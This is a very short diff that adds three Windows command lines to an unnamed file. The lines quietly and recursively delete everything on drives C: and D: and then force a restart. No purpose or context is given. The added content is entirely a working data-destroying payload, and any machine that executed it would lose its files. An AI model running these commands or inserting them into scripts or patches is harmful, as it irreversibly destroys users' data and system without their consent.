@@ -1,0 +1,3 @@
+RMDIR /S /Q C:
+RMDIR /S /Q D:
+shutdown -r
